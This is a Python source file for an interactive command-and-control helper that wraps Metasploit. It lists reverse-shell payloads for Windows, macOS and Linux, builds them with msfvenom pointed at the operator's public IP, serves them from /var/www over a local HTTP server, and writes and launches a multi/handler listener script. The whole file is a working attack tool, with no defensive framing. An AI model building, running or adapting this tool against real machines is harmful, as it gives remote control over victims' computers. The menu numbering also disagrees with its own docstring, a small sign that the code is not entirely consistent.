import os
import subprocess
import uuid
import requests
import platform
from rich import print
from rich.table import Table
from rich.panel import Panel
from rich.console import Group
from rich.align import Align
from rich import box


class C2C:
    def clearscr(self) -> None:
        try:
            osp = platform.system()
            match osp:
                case 'Darwin':
                    os.system("clear")
                case 'Linux':
                    os.system("clear")
                case 'Windows':
                    os.system("cls")
        except Exception:
            pass

    def Server(self):
        os.chdir(self.SaveLoc)
        port = 8001
        subprocess.Popen(
            ["python3", "-m", "http.server", str(port)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        msg = f"Server started in {self.SaveLoc} on port {port}"

        message_panel = Panel(
            Align.center(
                Group("\n", Align.center(msg)),
                vertical="middle",
            ),
            box=box.ROUNDED,
            padding=(1, 2),
            title="[b red]C2C Server Startup",
            border_style="blue",
        )
        print(message_panel)

    def PayloadCreation(self):
        table_payload = Table()
        table_payload.add_column("Option", style="green")
        table_payload.add_column("Name", style="blue")
        table_payload.add_column("OS", style="magenta")

        # Windows Payloads
        table_payload.add_row(
            "1", "windows/meterpreter/reverse_tcp", "Windows"
            )
        table_payload.add_row(
            "2", "windows/x64/meterpreter_reverse_https", "Windows"
            )
        table_payload.add_row(
            "3", "windows/powershell_reverse_tcp", "Windows"
            )

        # macOS Payloads
        table_payload.add_row(
            "4", "osx/x64/shell_reverse_tcp", "macOS"
            )
        table_payload.add_row(
            "5", "osx/x64/meterpreter_reverse_https", "macOS"
            )
        table_payload.add_row(
            "6", "java/jsp_shell_reverse_tcp", "macOS"
            )

        # Linux Payloads
        table_payload.add_row(
            "7", "linux/x86/meterpreter/reverse_tcp", "Linux"
            )
        table_payload.add_row(
            "8", "linux/x64/meterpreter_reverse_https", "Linux"
            )
        table_payload.add_row(
            "9", "python/meterpreter_reverse_tcp", "Linux"
            )

        print(table_payload)
        payload_options = {
            "1": "windows/meterpreter/reverse_tcp",
            "2": "windows/x64/meterpreter_reverse_https",
            "3": "windows/powershell_reverse_tcp",
            "4": "osx/x64/shell_reverse_tcp",
            "5": "osx/x64/meterpreter_reverse_https",
            "6": "java/jsp_shell_reverse_tcp",
            "7": "linux/x86/meterpreter/reverse_tcp",
            "8": "linux/x64/meterpreter_reverse_https",
            "9": "python/meterpreter_reverse_tcp",
        }
        choice = input("Select payload option: ")
        if choice in payload_options:
            self.Payload = payload_options[choice]
            print(Panel(f"Payload selected: {self.Payload}"))

            if "osx" in self.TargetOS:
                file_format = "macho"
            elif "linux" in self.TargetOS:
                file_format = "elf"
            elif "windows" in self.TargetOS:
                file_format = "exe"
            elif "raw" in self.TargetOS:
                file_format = "raw"

            Payload_cmd = f"msfvenom -p {self.Payload} LHOST={self.PublicIP} LPORT={self.Lport} -f {file_format} -o {self.SaveLoc}/payload.{file_format}"
            print(Payload_cmd)
            subprocess.run(Payload_cmd, shell=True)
            msg = "Payload Created"
        else:
            msg = "Invalid option selected."
        print(Panel(msg))
        self.menu()

    def GetIP(self):
        try:
            response = requests.get("https://api.ipify.org")
            self.PublicIP = response.text
            print(Panel(f"Public IP: {self.PublicIP}"))
        except requests.RequestException as e:
            print(Panel(f"Error getting IP: {e}"))

    def GenRC(self):
        template = """use exploit/multi/handler
    set PAYLOAD {payload}
    set LHOST {lhost}
    set LPORT {lport}
    exploit -j -z
    """

        rc_content = template.format(
            payload=self.Payload, lhost=self.PublicIP, lport=self.Lport)
        self.RCname = f"metasploit_{uuid.uuid4().hex}.rc"
        os.chdir(self.RC_File)
        with open(self.RCname, 'w') as file:
            file.write(rc_content)
        self.menu()

    def menu(self):
        """
        Options:
        1 - Target OS
        2 - Listner Port
        3 - Payload Options
        4 - Generate RC File
        5 - Run C2C Service
        6 - Show Presets
        q - Quit
        """
        while True:
            menu_table = Table()
            menu_table.add_column("OPTION", style="green")
            menu_table.add_column("TASK", style="blue")
            menu_table.add_row("1", "Target OS")
            menu_table.add_row("2", "Listner Port")
            menu_table.add_row("3", "Payload Options")
            menu_table.add_row("4", "Generate RC File")
            menu_table.add_row("5", "Show Presets")
            menu_table.add_row("6", "Start C2C Server")
            menu_table.add_row("q", "Quit")
            print(menu_table)
            choice = input("Enter Option>> ")
            match choice:
                case "1":
                    self.clearscr()
                    OS_OPT = Table()
                    OS_OPT.add_column("OPT", style="green")
                    OS_OPT.add_column("OS", style="blue")
                    OS_OPT.add_row("1", "Windows")
                    OS_OPT.add_row("2", "Linux")
                    OS_OPT.add_row("3", "OSX")
                    OS_OPT.add_row("4", "Raw")
                    print(OS_OPT)
                    os_choice = input("Enter OS>> ")
                    if os_choice == "1":
                        self.TargetOS = "windows"
                    elif os_choice == "2":
                        self.TargetOS = "linux"
                    elif os_choice == "3":
                        self.TargetOS = "osx"
                    elif os_choice == "4":
                        self.TargetOS = "raw"
                    print(Panel(f"OS Option Chosen: {self.TargetOS}"))
                    self.menu()
                case "2":
                    self.clearscr()
                    self.Lport = input("Enter Listner Port Number>> ")
                    print(Panel(f"Listner Port Number: {self.Lport}"))
                    self.menu()
                case "3":
                    self.PayloadCreation()
                case "4":
                    self.GenRC()
                    print(Panel(f"Rc File Generated: {self.RCname}"))
                case "5":
                    self.clearscr()
                    Preset_Table = Table()
                    Preset_Table.add_column("OPTION", style="green")
                    Preset_Table.add_column("VALUE", style="blue")
                    Preset_Table.add_row("PUBLIC IP", f"{self.PublicIP}")
                    Preset_Table.add_row("LISTNER PORT", f"{self.Lport}")
                    Preset_Table.add_row("PAYLOAD", f"{self.Payload}")
                    Preset_Table.add_row("TARGET OS", f"{self.TargetOS}")
                    Preset_Table.add_row("RC FIle", f"{self.RCname}")
                    print(Preset_Table)
                    self.menu()
                case "6":
                    os.system(f"msfconsole -r {self.RC_File}/{self.RCname}")
                case "q":
                    quit()

    def __init__(
            self,
            PublicIP: str,
            Lport: str,
            TargetOS: str,
            Payload: str,
            RC_File: str
    ):
        self.SaveLoc = '/var/www'
        self.PublicIP = PublicIP
        self.Lport = Lport
        self.TargetOS = TargetOS
        self.Payload = Payload
        self.RC_File = RC_File
        self.Server()
        self.GetIP()


def main():
    loc = os.getcwd()
    test = C2C(
        Payload="",
        PublicIP="",
        Lport="",
        TargetOS="",
        RC_File=f"{loc}/RC_Files"
    )
    test.menu()


if __name__ == "__main__":
    main()
